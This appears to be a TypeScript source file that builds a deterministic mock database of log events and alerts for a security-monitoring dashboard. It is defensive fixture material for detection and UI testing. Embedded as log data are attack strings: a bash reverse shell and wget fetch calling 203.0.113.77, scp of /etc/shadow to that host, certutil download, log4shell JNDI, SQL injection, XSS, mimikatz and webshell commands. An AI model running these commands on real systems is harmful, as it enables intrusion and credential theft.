/**
 * Deterministic mock database for the dashboard (session S3): events, alerts and rules that
 * follow the shared schemas and the "Andes Retail" scenarios of ARCHITECTURE §4.3, plus
 * hostile strings (`<script>`, `' OR 1=1--`, an 8,192-character line) to prove the UI
 * renders log content as text.
 *
 * Content depends only on the seed; timestamps are relative to `now` so the default
 * "last 24 hours" views are populated whenever the mocks run.
 */
import {
  LEVEL_WEIGHT,
  MAX_MESSAGE_LENGTH,
  createAttackIndex,
  techniquesFromTags,
  type Alert,
  type AlertStatus,
  type AttackIndex,
  type FieldValue,
  type LogSource,
  type NormalizedEvent,
  type Resolution,
  type RuleMeta,
} from '@centinela/shared';
import attackData from '../../../../../data/mitre-attack/enterprise-attack.min.json';
import { int, mulberry32, pick, uuidv7, type Rng } from '../prng';
import { CENTINELA_FIXTURE_RULES, centinelaRuleSource } from './centinela-rules';
import { SIGMAHQ_FIXTURE_RULES } from './sigma-rules';

/** Commit of the vendored SigmaHQ subset (rules/sigma/README.md). */
export const SIGMAHQ_COMMIT = '05d1031f537e830b76da53bae2400c5814c89165';

const MINUTE = 60_000;
const HOUR = 60 * MINUTE;

/** The vendored rule files, as text, for `GET /api/rules/:id` (mock chunk only). */
const SIGMA_SOURCES = import.meta.glob<string>(
  [
    '../../../../../rules/sigma/linux/**/*.yml',
    '../../../../../rules/sigma/web/**/*.yml',
    '../../../../../rules/sigma/windows/process_creation/proc_creation_win_{certutil_download,conhost_legacy_option,hktl_mimikatz_command_line,mshta_susp_execution,net_user_add,office_spawn_exe_from_users_directory,powershell_base64_encoded_cmd,regsvr32_susp_parent,rundll32_susp_activity}.yml',
  ],
  { query: '?raw', import: 'default', eager: true },
);

export function sigmaSource(path: string): string | undefined {
  return SIGMA_SOURCES[`../../../../../${path}`];
}

export interface MockDb {
  readonly attack: AttackIndex;
  events: NormalizedEvent[];
  alerts: Alert[];
  /** Contributing event ids per alert, oldest first. */
  alertEvents: Map<string, string[]>;
  rules: RuleMeta[];
  ruleSources: Map<string, string>;
}

export interface MockDbOptions {
  seed?: number;
  now?: number;
}

// ---------------------------------------------------------------------------
// Rules
// ---------------------------------------------------------------------------

/** Mock-only flags (illustrative): S2's engine decides support and S4 stores enablement. */
const UNSUPPORTED: Readonly<Record<string, string>> = {
  'rules/sigma/linux/builtin/guacamole/lnx_guacamole_susp_guacamole.yml':
    'logsource:unrouted (service guacamole has no parser)',
  'rules/sigma/web/webserver_generic/web_iis_tilt_shortname_scan.yml':
    'regex:not-re2 (lookaround in |re pattern)',
};
const DISABLED = new Set(['rules/sigma/linux/builtin/lnx_apt_equationgroup_lnx.yml']);

function buildRules(attack: AttackIndex): { rules: RuleMeta[]; sources: Map<string, string> } {
  const rules: RuleMeta[] = [];
  const sources = new Map<string, string>();

  for (const rule of CENTINELA_FIXTURE_RULES) {
    const techniques = techniquesFromTags(rule.tags);
    const folder = rule.type === 'sigma' ? 'centinela' : 'correlation';
    rules.push({
      id: rule.id,
      name: rule.name,
      title: rule.title,
      description: rule.description,
      type: rule.type,
      level: rule.level,
      status: 'experimental',
      author: 'DavidRamPari',
      references: [],
      date: '2026-10-25',
      modified: null,
      tags: rule.tags,
      techniques,
      tactics: attack.tacticsFor(techniques),
      logsource: rule.logsource,
      falsepositives: rule.falsepositives,
      origin: 'centinela',
      path: `rules/${folder}/${rule.name}.yml`,
      url: null,
      license: 'MIT',
      supported: true,
      unsupportedReason: null,
      buildingBlock: rule.buildingBlock,
      enabled: true,
    });
    sources.set(rule.id, centinelaRuleSource(rule));
  }

  for (const rule of SIGMAHQ_FIXTURE_RULES) {
    const techniques = techniquesFromTags(rule.tags);
    const reason = UNSUPPORTED[rule.path] ?? null;
    rules.push({
      id: rule.id,
      name: rule.name,
      title: rule.title,
      description: rule.description,
      type: 'sigma',
      level: rule.level,
      status: rule.status,
      author: rule.author,
      references: rule.references,
      date: rule.date,
      modified: rule.modified,
      tags: rule.tags,
      techniques,
      tactics: attack.tacticsFor(techniques),
      logsource: rule.logsource,
      falsepositives: rule.falsepositives,
      origin: 'sigmahq',
      path: rule.path,
      url: `https://github.com/SigmaHQ/sigma/blob/${SIGMAHQ_COMMIT}/rules/${rule.path.slice('rules/sigma/'.length)}`,
      license: 'DRL-1.1',
      supported: reason === null,
      unsupportedReason: reason,
      buildingBlock: false,
      enabled: !DISABLED.has(rule.path),
    });
    sources.set(rule.id, sigmaSource(rule.path) ?? `# Source of ${rule.path} not bundled\n`);
  }
  return { rules, sources };
}

// ---------------------------------------------------------------------------
// Events
// ---------------------------------------------------------------------------

const LIMA_OFFSET_MS = -5 * HOUR;
const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

/** Lima wall-clock parts (UTC−05:00, no daylight saving), as the S1 generator writes. */
function limaParts(ts: number) {
  const d = new Date(ts + LIMA_OFFSET_MS);
  const pad = (n: number, width = 2) => String(n).padStart(width, '0');
  return {
    date: `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())}`,
    time: `${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`,
    micros: `${pad(d.getUTCMilliseconds(), 3)}000`,
    clfDate: `${pad(d.getUTCDate())}/${MONTHS[d.getUTCMonth()] ?? 'Jan'}/${d.getUTCFullYear()}`,
  };
}

function truncate(value: string): string {
  return value.length > MAX_MESSAGE_LENGTH ? value.slice(0, MAX_MESSAGE_LENGTH) : value;
}

function compact(fields: Record<string, FieldValue | undefined>): Record<string, FieldValue> {
  const out: Record<string, FieldValue> = {};
  for (const [key, value] of Object.entries(fields)) {
    if (value !== undefined) out[key] = typeof value === 'string' ? truncate(value) : value;
  }
  return out;
}

interface AuthInput {
  ts: number;
  host: string;
  program: string;
  text: string;
  action: string;
  outcome: NormalizedEvent['outcome'];
  category: NormalizedEvent['category'];
  user?: string;
  ip?: string;
  port?: number;
  fields?: Record<string, FieldValue | undefined>;
}

interface WebInput {
  ts: number;
  host: string;
  server?: 'nginx' | 'apache';
  ip: string;
  method?: string;
  path: string;
  query?: string;
  status: number;
  bytes?: number;
  referer?: string;
  ua: string;
}

interface SysmonInput {
  ts: number;
  host: string;
  user: string;
  image: string;
  commandLine: string;
  parentImage: string;
  parentCommandLine: string;
  originalFileName?: string;
  integrityLevel?: string;
}

class EventFactory {
  readonly events: NormalizedEvent[] = [];
  private pid = 1200;

  constructor(
    private readonly rng: Rng,
    private readonly now: number,
  ) {}

  private push(event: Omit<NormalizedEvent, 'id' | 'ingestedAt'>, ts: number): NormalizedEvent {
    const full: NormalizedEvent = {
      id: uuidv7(ts, this.rng),
      ingestedAt: new Date(Math.min(this.now, ts + int(this.rng, 1, 20) * 1000)).toISOString(),
      ...event,
    };
    this.events.push(full);
    return full;
  }

  auth(input: AuthInput): NormalizedEvent {
    const program = input.program;
    const pid = (this.pid += int(this.rng, 1, 40));
    const parts = limaParts(input.ts);
    const message = `${parts.date}T${parts.time}.${parts.micros}-05:00 ${input.host} ${program}[${pid}]: ${input.text}`;
    const logsources: LogSource[] =
      program === 'sshd' || program === 'sudo'
        ? [
            { product: 'linux', service: program },
            { product: 'linux', service: 'auth' },
          ]
        : [{ product: 'linux', service: 'auth' }];
    return this.push(
      {
        ts: new Date(input.ts).toISOString(),
        source: 'linux_auth',
        host: input.host,
        logsources,
        category: input.category,
        action: input.action,
        outcome: input.outcome,
        ...(input.user !== undefined ? { user: truncate(input.user) } : {}),
        ...(input.ip !== undefined ? { srcIp: input.ip } : {}),
        ...(input.port !== undefined ? { srcPort: input.port } : {}),
        message: truncate(message),
        fields: compact({
          'event.action': input.action,
          'event.outcome': input.outcome,
          'event.category': input.category,
          'host.name': input.host,
          'process.name': program,
          'process.pid': pid,
          'user.name': input.user,
          'source.ip': input.ip,
          'source.port': input.port,
          ...input.fields,
        }),
      },
      input.ts,
    );
  }

  sshFailure(ts: number, host: string, user: string, ip: string, invalid = false) {
    const port = int(this.rng, 30000, 65000);
    return this.auth({
      ts,
      host,
      program: 'sshd',
      text: `Failed password for ${invalid ? 'invalid user ' : ''}${user} from ${ip} port ${port} ssh2`,
      action: 'ssh_login',
      outcome: 'failure',
      category: 'authentication',
      user,
      ip,
      port,
      fields: { 'ssh.method': 'password', 'ssh.invalid_user': invalid },
    });
  }

  sshSuccess(ts: number, host: string, user: string, ip: string, method = 'publickey') {
    const port = int(this.rng, 30000, 65000);
    const suffix = method === 'publickey' ? ` ssh2: ED25519 SHA256:${'k'.repeat(8)}` : ' ssh2';
    return this.auth({
      ts,
      host,
      program: 'sshd',
      text: `Accepted ${method} for ${user} from ${ip} port ${port}${suffix}`,
      action: 'ssh_login',
      outcome: 'success',
      category: 'authentication',
      user,
      ip,
      port,
      fields: { 'ssh.method': method },
    });
  }

  sudo(ts: number, host: string, user: string, command: string, target = 'root') {
    return this.auth({
      ts,
      host,
      program: 'sudo',
      text: `${user} : TTY=pts/0 ; PWD=/home/${user} ; USER=${target} ; COMMAND=${command}`,
      action: 'sudo_command',
      outcome: 'success',
      category: 'process',
      user,
      fields: {
        'sudo.command': command,
        'sudo.target_user': target,
        'sudo.tty': 'pts/0',
        'sudo.pwd': `/home/${user}`,
      },
    });
  }

  web(input: WebInput): NormalizedEvent {
    const server = input.server ?? 'nginx';
    const method = input.method ?? 'GET';
    const bytes = input.bytes ?? int(this.rng, 300, 24000);
    const parts = limaParts(input.ts);
    const target = input.query !== undefined ? `${input.path}?${input.query}` : input.path;
    const referer = input.referer ?? '-';
    const message = `${input.ip} - - [${parts.clfDate}:${parts.time} -0500] "${method} ${target} HTTP/1.1" ${input.status} ${bytes} "${referer}" "${input.ua}"`;
    const outcome = input.status < 400 ? 'success' : 'failure';
    return this.push(
      {
        ts: new Date(input.ts).toISOString(),
        source: server === 'nginx' ? 'nginx_access' : 'apache_access',
        host: input.host,
        logsources: [{ category: 'webserver' }, { service: server }],
        category: 'web',
        action: 'http_request',
        outcome,
        srcIp: input.ip,
        message: truncate(message),
        fields: compact({
          'event.action': 'http_request',
          'event.outcome': outcome,
          'event.category': 'web',
          'host.name': input.host,
          'source.ip': input.ip,
          'c-ip': input.ip,
          'cs-method': method,
          'cs-uri-stem': input.path,
          'cs-uri-query': input.query,
          'cs-version': 'HTTP/1.1',
          'sc-status': input.status,
          'sc-bytes': bytes,
          'cs-referer': input.referer,
          'cs-user-agent': input.ua,
          'http.request.method': method,
          'url.path': input.path,
          'url.query': input.query,
          'url.original': target,
          'http.response.status_code': input.status,
          'http.response.body.bytes': bytes,
          'http.request.referrer': input.referer,
          'user_agent.original': input.ua,
          'http.version': '1.1',
        }),
      },
      input.ts,
    );
  }

  sysmon(input: SysmonInput): NormalizedEvent {
    const ts = new Date(input.ts).toISOString();
    const processName = input.image.split('\\').pop() ?? input.image;
    const eventData = {
      Image: input.image,
      CommandLine: input.commandLine,
      OriginalFileName: input.originalFileName ?? processName.toUpperCase(),
      ParentImage: input.parentImage,
      ParentCommandLine: input.parentCommandLine,
      User: input.user,
      IntegrityLevel: input.integrityLevel ?? 'Medium',
      CurrentDirectory: 'C:\\Users\\public\\',
    };
    const message = JSON.stringify({
      EventID: 1,
      Computer: input.host,
      UtcTime: ts.replace('T', ' ').replace('Z', ''),
      ...eventData,
    });
    return this.push(
      {
        ts,
        source: 'sysmon',
        host: input.host,
        logsources: [{ product: 'windows', category: 'process_creation' }],
        category: 'process',
        action: 'process_start',
        outcome: 'success',
        user: input.user,
        message: truncate(message),
        fields: compact({
          'event.action': 'process_start',
          'event.outcome': 'success',
          'event.category': 'process',
          'host.name': input.host,
          'process.name': processName,
          'user.name': input.user,
          ...eventData,
        }),
      },
      input.ts,
    );
  }
}

// ---------------------------------------------------------------------------
// Background traffic
// ---------------------------------------------------------------------------

const STAFF = ['ana.quispe', 'luis.mamani', 'sofia.rojas', 'diego.huaman'];
const BROWSER_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
];
const BOT_UA = 'Mozilla/5.0 (compatible; ExampleBot/2.1; +https://bot.example/info)';
const PAGES = [
  '/',
  '/products/1042',
  '/products/2210',
  '/cart',
  '/static/app.js',
  '/static/site.css',
  '/search?q=zapatillas',
];

function background(f: EventFactory, rng: Rng, start: number, end: number, count: number) {
  for (let i = 0; i < count; i += 1) {
    const ts = start + Math.floor(rng() * (end - start));
    const kind = rng();
    if (kind < 0.18) {
      const user = pick(rng, STAFF);
      const ip = `10.20.1.${int(rng, 10, 60)}`;
      f.sshSuccess(ts, 'bastion-01', user, ip);
      f.auth({
        ts: ts + 1000,
        host: 'bastion-01',
        program: 'sshd',
        text: `pam_unix(sshd:session): session opened for user ${user}(uid=${int(rng, 1001, 1010)}) by (uid=0)`,
        action: 'session_opened',
        outcome: 'success',
        category: 'session',
        user,
        fields: { 'session.service': 'sshd' },
      });
    } else if (kind < 0.3) {
      f.auth({
        ts,
        host: pick(rng, ['db-01', 'bastion-01']),
        program: 'CRON',
        text: 'pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)',
        action: 'session_opened',
        outcome: 'success',
        category: 'session',
        user: 'root',
        fields: { 'session.service': 'cron' },
      });
    } else if (kind < 0.38) {
      const user = pick(rng, STAFF);
      f.sudo(
        ts,
        pick(rng, ['db-01', 'bastion-01']),
        user,
        pick(rng, [
          '/usr/bin/apt update',
          '/usr/bin/systemctl restart nginx',
          '/usr/bin/journalctl -u ssh',
        ]),
      );
    } else if (kind < 0.42) {
      const user = pick(rng, STAFF);
      f.sshFailure(ts, 'bastion-01', user, `10.20.1.${int(rng, 10, 60)}`);
    } else if (kind < 0.46) {
      f.web({
        ts,
        host: 'intranet-01',
        server: 'apache',
        ip: `10.20.2.${int(rng, 10, 90)}`,
        path: pick(rng, ['/wiki/', '/wiki/Onboarding', '/reports/q3.pdf']),
        status: pick(rng, [200, 200, 304]),
        ua: pick(rng, BROWSER_UAS),
      });
    } else if (kind < 0.52) {
      f.web({
        ts,
        host: pick(rng, ['web-01', 'web-02']),
        ip: `198.18.${int(rng, 0, 3)}.${int(rng, 1, 254)}`,
        path: '/robots.txt',
        status: 200,
        ua: BOT_UA,
      });
    } else if (kind < 0.56) {
      f.web({
        ts,
        host: pick(rng, ['web-01', 'web-02']),
        ip: `198.18.${int(rng, 0, 3)}.${int(rng, 1, 254)}`,
        path: '/favicon.ico',
        status: 404,
        ua: pick(rng, BROWSER_UAS),
      });
    } else {
      const page = pick(rng, PAGES);
      const [path = '/', query] = page.split('?');
      f.web({
        ts,
        host: pick(rng, ['web-01', 'web-02']),
        ip: `198.18.${int(rng, 0, 3)}.${int(rng, 1, 254)}`,
        path,
        ...(query !== undefined ? { query } : {}),
        status: 200,
        referer: rng() < 0.5 ? 'https://andes-retail.example/' : undefined,
        ua: pick(rng, BROWSER_UAS),
      });
    }
  }
}

// ---------------------------------------------------------------------------
// Alerts
// ---------------------------------------------------------------------------

interface AlertInput {
  ruleRef: string; // rule name (Centinela) or file name without .yml (SigmaHQ)
  events: NormalizedEvent[];
  status?: AlertStatus;
  resolution?: Resolution;
  note?: string;
  count?: number;
  groupKey?: string;
}

function ruleByRef(rules: readonly RuleMeta[], ref: string): RuleMeta {
  const rule = rules.find((r) => r.name === ref || r.path.endsWith(`/${ref}.yml`));
  if (!rule) throw new Error(`fixture rule not found: ${ref}`);
  return rule;
}

function unique<T>(values: Array<T | undefined>): T[] {
  return [...new Set(values.filter((v): v is T => v !== undefined))];
}

function makeAlert(rng: Rng, rules: readonly RuleMeta[], input: AlertInput) {
  const rule = ruleByRef(rules, input.ruleRef);
  const events = [...input.events].sort((a, b) => a.ts.localeCompare(b.ts));
  const first = events[0];
  const last = events[events.length - 1];
  if (!first || !last) throw new Error(`alert without events: ${input.ruleRef}`);
  const hosts = unique(events.map((e) => e.host));
  const ips = unique(events.map((e) => e.srcIp));
  const users = unique(events.map((e) => e.user));
  const host = hosts.length === 1 ? (hosts[0] ?? null) : null;
  const entity = ips[0] ?? users[0] ?? '';
  const groupKey =
    rule.type === 'correlation' ? (input.groupKey ?? `source.ip=${ips[0] ?? ''}`) : null;
  const dedupKey = groupKey ? `${rule.id}|${groupKey}` : `${rule.id}|${host ?? ''}|${entity}`;
  const status = input.status ?? 'new';
  const createdAt = Date.parse(last.ts) + int(rng, 2, 30) * 1000;
  const updatedAt = status === 'new' ? createdAt : createdAt + int(rng, 10, 90) * MINUTE;
  const alert: Alert = {
    id: uuidv7(createdAt, rng),
    ruleId: rule.id,
    ruleTitle: rule.title,
    ruleType: rule.type,
    level: rule.level,
    status,
    resolution: status === 'closed' ? (input.resolution ?? 'true_positive') : null,
    note: input.note ?? null,
    dedupKey,
    groupKey,
    host,
    techniques: rule.techniques,
    tactics: rule.tactics,
    entities: { ips, users, hosts },
    firstSeen: first.ts,
    lastSeen: last.ts,
    count: input.count ?? 1,
    author: rule.author,
    ruleUrl: rule.url,
    license: rule.license,
    createdAt: new Date(createdAt).toISOString(),
    updatedAt: new Date(updatedAt).toISOString(),
  };
  return { alert, eventIds: events.map((e) => e.id) };
}

// ---------------------------------------------------------------------------
// Scenarios
// ---------------------------------------------------------------------------

/** Hostile strings the UI must render as plain text (CLAUDE.md, security requirements). */
export const HOSTILE = {
  script: '<script>alert(document.cookie)</script>',
  img: '<img src=x onerror=alert(1)>',
  sqli: "' OR 1=1--",
} as const;

export function createMockDb({ seed = 42, now = Date.now() }: MockDbOptions = {}): MockDb {
  const rng = mulberry32(seed);
  const attack = createAttackIndex(attackData);
  const { rules, sources } = buildRules(attack);
  const f = new EventFactory(rng, now);
  const ago = (minutes: number) => now - minutes * MINUTE;
  const alerts: Array<{ alert: Alert; eventIds: string[] }> = [];
  const alert = (input: AlertInput) => alerts.push(makeAlert(rng, rules, input));

  background(f, rng, now - 24 * HOUR, now - MINUTE, 150);
  background(f, rng, now - 6 * 24 * HOUR, now - 25 * HOUR, 30);

  // ssh-bruteforce: root/admin from 203.0.113.45.
  const brute = Array.from({ length: 12 }, (_, i) =>
    f.sshFailure(ago(95) + i * 9000, 'bastion-01', i % 2 === 0 ? 'root' : 'admin', '203.0.113.45'),
  );
  alert({
    ruleRef: 'centinela-ssh-bruteforce',
    events: brute,
    groupKey: 'source.ip=203.0.113.45,host.name=bastion-01',
  });

  // password-spray: one attempt per user from 198.51.100.23.
  const sprayUsers = [
    'oracle',
    'test',
    'guest',
    'ubuntu',
    'postgres',
    'git',
    'jenkins',
    'ftp',
    'backup',
    'support',
  ];
  const spray = sprayUsers.map((user, i) =>
    f.sshFailure(ago(180) + i * 48_000, 'bastion-01', user, '198.51.100.23', true),
  );
  alert({
    ruleRef: 'centinela-ssh-password-spraying',
    events: spray,
    groupKey: 'source.ip=198.51.100.23',
  });

  // bruteforce-success, then post-compromise and privileged-user from the same session.
  const pre = Array.from({ length: 10 }, (_, i) =>
    f.sshFailure(ago(300) + i * 15_000, 'bastion-01', 'deploy', '203.0.113.77'),
  );
  const success = f.sshSuccess(ago(296), 'bastion-01', 'deploy', '203.0.113.77', 'password');
  alert({
    ruleRef: 'centinela-ssh-bruteforce',
    events: pre,
    status: 'acknowledged',
    groupKey: 'source.ip=203.0.113.77,host.name=bastion-01',
  });
  alert({
    ruleRef: 'centinela-ssh-bruteforce-success',
    events: [...pre, success],
    groupKey: 'source.ip=203.0.113.77',
  });
  alert({
    ruleRef: 'lnx_shell_susp_commands',
    events: [
      f.sudo(
        ago(292),
        'bastion-01',
        'deploy',
        '/usr/bin/sh -c cd /tmp; wget http://203.0.113.77/x; chmod +x x',
      ),
    ],
  });
  alert({
    ruleRef: 'lnx_shell_susp_rev_shells',
    events: [
      f.sudo(
        ago(291),
        'bastion-01',
        'deploy',
        '/usr/bin/bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1',
      ),
    ],
  });
  const created = f.auth({
    ts: ago(289),
    host: 'bastion-01',
    program: 'useradd',
    text: 'new user: name=backup2, UID=1007, GID=27, home=/home/backup2, shell=/bin/bash, from=/dev/pts/0',
    action: 'user_created',
    outcome: 'success',
    category: 'iam',
    user: 'backup2',
    fields: { 'user.id': '1007', 'group.id': '27' },
  });
  const added = f.auth({
    ts: ago(288),
    host: 'bastion-01',
    program: 'usermod',
    text: "add 'backup2' to group 'sudo'",
    action: 'user_added_to_group',
    outcome: 'success',
    category: 'iam',
    user: 'backup2',
    fields: { 'group.name': 'sudo' },
  });
  alert({ ruleRef: 'lnx_privileged_user_creation', events: [created] });
  alert({ ruleRef: 'centinela-user-created', events: [created] });
  alert({ ruleRef: 'centinela-user-added-to-privileged-group', events: [added] });
  alert({
    ruleRef: 'centinela-privileged-account-created',
    events: [created, added],
    groupKey: 'user.name=backup2,host.name=bastion-01',
  });
  alert({
    ruleRef: 'lnx_file_copy',
    events: [
      f.sudo(
        ago(286),
        'bastion-01',
        'deploy',
        '/usr/bin/scp /etc/shadow deploy@203.0.113.77:/tmp/',
      ),
    ],
  });

  // sudo-not-allowed on db-01.
  const notAllowed = [0, 1, 2].map((i) =>
    f.auth({
      ts: ago(420) + i * 20_000,
      host: 'db-01',
      program: 'sudo',
      text: 'intern : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/intern ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow',
      action: 'sudo_not_in_sudoers',
      outcome: 'failure',
      category: 'iam',
      user: 'intern',
      fields: { 'sudo.command': '/usr/bin/cat /etc/shadow', 'sudo.target_user': 'root' },
    }),
  );
  alert({
    ruleRef: 'centinela-sudo-user-not-in-sudoers',
    events: notAllowed,
    status: 'acknowledged',
    count: 3,
    note: 'Asked the intern team lead to confirm.',
  });
  const typo = f.auth({
    ts: ago(500),
    host: 'db-01',
    program: 'sudo',
    text: 'ana.quispe : 1 incorrect password attempt ; TTY=pts/0 ; PWD=/home/ana.quispe ; USER=root ; COMMAND=/usr/bin/apt upgrade',
    action: 'sudo_auth_failure',
    outcome: 'failure',
    category: 'authentication',
    user: 'ana.quispe',
    fields: { 'sudo.command': '/usr/bin/apt upgrade', 'sudo.failed_attempts': 1 },
  });
  alert({
    ruleRef: 'centinela-sudo-auth-failure',
    events: [typo],
    status: 'closed',
    resolution: 'benign',
    note: 'Password typo during maintenance.',
  });

  // web-recon from 192.0.2.10 with scanner user agents (mostly 404), one 8,192-character line.
  const scanUas = ['Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)', 'gobuster/3.6'];
  const recon = Array.from({ length: 24 }, (_, i) =>
    f.web({
      ts: ago(240) + i * 6000,
      host: 'web-01',
      ip: '192.0.2.10',
      path: pick(rng, [
        '/admin/',
        '/.git/config',
        '/backup.zip',
        '/phpmyadmin/',
        '/server-status',
        '/.env',
        '/wp-admin/',
      ]),
      status: 404,
      ua: scanUas[i % 2] ?? 'gobuster/3.6',
    }),
  );
  const longLine = f.web({
    ts: ago(238),
    host: 'web-01',
    ip: '192.0.2.10',
    path: `/${'A'.repeat(9000)}`,
    status: 414,
    ua: 'gobuster/3.6',
  });
  alert({ ruleRef: 'web_susp_useragents', events: recon.slice(0, 6), count: 6 });
  alert({
    ruleRef: 'centinela-web-scanning-burst',
    events: [...recon, longLine],
    groupKey: 'source.ip=192.0.2.10,host.name=web-01',
  });

  // sqli, including the classic hostile string.
  const sqli = [
    'id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--',
    'id=%271%27%3D%271',
    `id=1${HOSTILE.sqli}`,
    'id=1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users--',
  ].map((query, i) =>
    f.web({
      ts: ago(232) + i * 4000,
      host: 'web-01',
      ip: '192.0.2.10',
      path: '/products',
      query,
      status: i % 2 ? 500 : 200,
      ua: 'sqlmap/1.8#stable (https://sqlmap.example)',
    }),
  );
  alert({ ruleRef: 'web_sql_injection_in_access_logs', events: sqli, count: 4 });

  // path-traversal, log4shell probe, XSS on web-02.
  const traversal = [
    f.web({
      ts: ago(150),
      host: 'web-02',
      ip: '198.51.100.61',
      path: '/download',
      query: 'file=../../../../etc/passwd',
      status: 400,
      ua: 'curl/8.5.0',
    }),
    f.web({
      ts: ago(149),
      host: 'web-02',
      ip: '198.51.100.61',
      path: '/download',
      query: 'file=..%252f..%252f..%252fetc%252fpasswd',
      status: 400,
      ua: 'curl/8.5.0',
    }),
  ];
  alert({ ruleRef: 'web_path_traversal_exploitation_attempt', events: traversal, count: 2 });
  alert({
    ruleRef: 'web_jndi_exploit',
    events: [
      f.web({
        ts: ago(130),
        host: 'web-02',
        ip: '203.0.113.99',
        path: '/',
        status: 200,
        ua: '${jndi:ldap://203.0.113.99:1389/Basic/Command/Base64/aWQ=}',
      }),
    ],
  });
  alert({
    ruleRef: 'web_xss_in_access_logs',
    events: [
      f.web({
        ts: ago(70),
        host: 'web-02',
        ip: '192.0.2.44',
        path: '/search',
        query: `q=${HOSTILE.script}`,
        status: 200,
        ua: pick(rng, BROWSER_UAS),
        referer: HOSTILE.img,
      }),
    ],
  });

  // webshell on web-01.
  const webshell = ['cmd=whoami', 'cmd=net+user'].map((query, i) =>
    f.web({
      ts: ago(60) + i * 30_000,
      host: 'web-01',
      ip: '203.0.113.77',
      path: '/uploads/img.php',
      query,
      status: 200,
      ua: 'python-requests/2.32.3',
    }),
  );
  alert({
    ruleRef: 'web_win_webshells_in_access_logs',
    events: webshell,
    status: 'acknowledged',
    count: 2,
  });
  alert({
    ruleRef: 'web_ssti_in_access_logs',
    events: [
      f.web({
        ts: ago(640),
        host: 'web-01',
        ip: '10.20.3.15',
        path: '/search',
        query: 'q=%7B%7B7*7%7D%7D',
        status: 200,
        ua: pick(rng, BROWSER_UAS),
      }),
    ],
    status: 'closed',
    resolution: 'false_positive',
    note: 'Internal QA test of the search template.',
  });

  // Brute force with hostile user names (rendered as text).
  const hostileBrute = [
    HOSTILE.img,
    HOSTILE.sqli,
    'root',
    HOSTILE.script,
    'admin',
    'root',
    'admin',
    'root',
    'admin',
    'root',
  ].map((user, i) =>
    f.sshFailure(ago(700) + i * 7000, 'bastion-01', user, '192.0.2.66', i % 2 === 0),
  );
  alert({
    ruleRef: 'centinela-ssh-bruteforce',
    events: hostileBrute,
    status: 'closed',
    resolution: 'true_positive',
    note: 'Blocked 192.0.2.66 at the firewall.',
    groupKey: 'source.ip=192.0.2.66,host.name=bastion-01',
  });

  // Windows workstation WS-0142 (Sysmon process creation).
  const ws = 'WS-0142';
  const user = 'ANDES\\m.condori';
  const explorer = {
    parentImage: 'C:\\Windows\\explorer.exe',
    parentCommandLine: 'C:\\Windows\\Explorer.EXE',
  };
  const win = (
    minutes: number,
    image: string,
    commandLine: string,
    parent = explorer,
    integrityLevel?: string,
  ) =>
    f.sysmon({
      ts: ago(minutes),
      host: ws,
      user,
      image,
      commandLine,
      ...parent,
      ...(integrityLevel ? { integrityLevel } : {}),
    });
  const word = {
    parentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
    parentCommandLine: '"WINWORD.EXE" /n "C:\\Users\\m.condori\\Downloads\\factura.docm"',
  };
  alert({
    ruleRef: 'proc_creation_win_office_spawn_exe_from_users_directory',
    events: [
      win(
        45,
        'C:\\Users\\m.condori\\AppData\\Roaming\\update.exe',
        'C:\\Users\\m.condori\\AppData\\Roaming\\update.exe',
        word,
      ),
    ],
  });
  alert({
    ruleRef: 'proc_creation_win_powershell_base64_encoded_cmd',
    events: [
      win(
        44,
        'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        'powershell.exe -NoP -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=',
        word,
      ),
    ],
  });
  alert({
    ruleRef: 'proc_creation_win_certutil_download',
    events: [
      win(
        43,
        'C:\\Windows\\System32\\certutil.exe',
        'certutil.exe -urlcache -split -f http://203.0.113.77/p.exe C:\\Users\\Public\\p.exe',
      ),
    ],
  });
  alert({
    ruleRef: 'proc_creation_win_mshta_susp_execution',
    events: [
      win(42, 'C:\\Windows\\System32\\mshta.exe', 'mshta.exe C:\\Users\\Public\\invoice.png'),
    ],
  });
  alert({
    ruleRef: 'proc_creation_win_rundll32_susp_activity',
    events: [
      win(
        41,
        'C:\\Windows\\System32\\rundll32.exe',
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
      ),
    ],
  });
  alert({
    ruleRef: 'proc_creation_win_hktl_mimikatz_command_line',
    events: [
      win(
        40,
        'C:\\Users\\Public\\m.exe',
        'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
        explorer,
        'High',
      ),
    ],
  });
  alert({
    ruleRef: 'proc_creation_win_net_user_add',
    events: [win(39, 'C:\\Windows\\System32\\net.exe', 'net user support2 P@ssw0rd! /add')],
    status: 'acknowledged',
  });
  alert({
    ruleRef: 'proc_creation_win_conhost_legacy_option',
    events: [
      win(
        38,
        'C:\\Windows\\System32\\conhost.exe',
        'conhost.exe 0xffffffff -ForceV1',
        explorer,
        'High',
      ),
    ],
  });

  // Older, already triaged alerts (outside the default 24-hour range).
  const oldBrute = Array.from({ length: 11 }, (_, i) =>
    f.sshFailure(ago(2 * 24 * 60) + i * 8000, 'bastion-01', 'root', '192.0.2.200'),
  );
  alert({
    ruleRef: 'centinela-ssh-bruteforce',
    events: oldBrute,
    status: 'closed',
    resolution: 'true_positive',
    groupKey: 'source.ip=192.0.2.200,host.name=bastion-01',
  });
